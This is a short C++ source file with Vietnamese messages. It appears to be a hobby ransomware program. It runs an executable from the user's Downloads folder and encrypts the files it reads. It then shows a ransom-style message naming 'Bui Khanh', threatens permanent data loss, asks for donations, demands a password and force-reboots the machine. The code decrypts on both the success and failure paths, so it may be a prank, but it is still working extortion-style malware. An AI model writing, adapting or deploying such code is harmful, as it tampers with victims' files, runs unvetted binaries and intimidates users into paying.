#include "CPP/header/decript.h"
#include "CPP/header/encript.h"
#include "khanhyeucau.h"
#include <cstdlib>
#include <iostream>
#include <thread>
using namespace std;
void Sucessfully() {
  const int total = 100;

  for (int i = 0; i <= total; ++i) {
    // In ra tiến trình hiện tại
    std::cout << "\r[" << i << "%] DANG KHOI PHUC DU LIEU..." << std::flush;

    // Đợi một chút để mô phỏng tiến trình
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
  }
}
void RunExecutable() {
  const char *username = getenv("USERNAME");
  if (username == nullptr) {
    // Handle the error if USERNAME is not found
    return;
  }

  // Construct the full path of the .exe file
  std::string exePath = "C:\\Users\\" + std::string(username) +
                        "\\Downloads\\UngDungThanThien\\vainho.exe";

  // Run the .exe file
  system(exePath.c_str());
}
int main() {
  RunExecutable();
  PassWord khanh;
  int time = 5;
  string MATKHAU;
  int keyrevert = revertKey(khanh.pass);

  vector<string> files = readFile();
  encryptFiles(files, keyrevert);

  cout << "MAY TINH CUA BAN DA BI MA HOA BOI BUI KHANH\n";
  cout << "Hay Nhap Dung Mat Khau Neu Khong Ban Se Bi Mat Du Lieu "
          "\x1B[31mVINH VIEN!\033[0m\t\t\n";
  cout << "Thang Nao Co Tien Thi Donate Cho Bui Khanh!!!\n";
  while (1) {
    cout << "Nhap Mat Khau(Con " << time << " lan): ";
    cin >> MATKHAU;
    if (MATKHAU != khanh.pass) {
      cout << "Nhap Sai!\n";
      time--;
    } else {
      decript(files, keyrevert);
      system("clear");
      cout << "MAT KHAU DUNG!\n";
      Sucessfully();
      system("shutdown /r /t 0");
    }
    if (time == 0) {
      cout << "GOOD BYE DU LIEU TRONG: ";
      for (int i = 0; i <= 3; ++i) {
        std::cout << '\r' << i << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
      }
      decript(files, keyrevert);
      system("shutdown /r /t 0");
    }
  }
}
